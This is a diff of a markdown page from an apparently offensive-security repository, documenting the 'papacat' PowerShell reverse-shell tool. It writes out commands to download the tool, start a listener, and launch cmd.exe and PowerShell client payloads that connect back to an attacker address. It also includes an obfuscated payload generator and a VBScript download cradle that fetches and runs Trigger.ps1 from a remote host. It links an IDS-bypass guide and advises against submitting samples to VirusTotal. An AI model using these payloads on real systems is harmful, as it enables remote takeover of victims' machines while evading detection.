@@ -71,26 +71,26 @@
 
 <br />
 
-### Download cmdlet
+#### Download cmdlet
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/hacking-material-books/master/papacat.ps1" -OutFile "papacat.ps1"
 ```
 
 <br />
 
-### handler (listenner)
+#### handler (listenner)
 ```powershell
 Import-Module -Name .\papacat.ps1 -Force
-papacat -l -p 666
+papacat -l -p 666 -v
 ```
 
-### Cmd Client (payload)
+#### Cmd Client (payload)
 ```powershell
 Import-Module -Name .\papacat.ps1 -Force
-papacat -c 192.168.1.72 -e cmd.exe -p 666
+papacat -c 192.168.1.72 -e cmd.exe -p 666 -v
 ```
 
-### powershell Client (payload)
+#### powershell Client (payload)
 ```powershell
 Import-Module -Name .\papacat.ps1 -Force
 papacat -c 192.168.1.72 -ep -p 666 -v
@@ -104,7 +104,7 @@ papacat -c 192.168.1.72 -ep -p 666 -v
 
 <br />
 
-### [update.vbs] download crandle
+#### [update.vbs] download crandle
 ```vbscript
 ' Author: @r00t-3xp10it (ssa)
 ' Application: papacat download crandle
@@ -124,13 +124,12 @@ ObjConsole.Run("powershell.exe cd $Env:TMP;iwr -Uri http://"+Cmd+"/Trigger.ps1 -
 
 <br />
 
-### Download cmdlet
+#### Download cmdlet
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/hacking-material-books/master/papacat.ps1" -OutFile "papacat.ps1"
 ```
 
-
-### Generate - Cmd Client (payload) Obfucated
+#### Generate - Cmd Client (payload) Obfucated
 ```powershell
 Import-Module -Name .\papacat.ps1 -Force
 papacat -c 192.168.1.72 -e cmd.exe -p 666 -g > Trigger.ps1
@@ -156,7 +155,6 @@ $LastRanges = "$TrithRange" + ":" + "8080" -join ''                    #.72:8080
 ((Get-Content -Path "update.vbs" -Raw) -Replace "Server@Local@host","$Local_Host")|Set-Content -Path "update.vbs" 
 ``` 
 
-
 <br />
 
 - start the handler `Import-Module -Name .\papacat.ps1 -Force;papacat -l -p 666`
@@ -168,9 +166,9 @@ $LastRanges = "$TrithRange" + ":" + "8080" -join ''                    #.72:8080
 
 <br /><br />
 
-### URL
+#### URL
 https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1<br />
 https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells
 
-## Final Notes
+# Final Notes
 Dont Test this on VirusTotal or similar websites ...
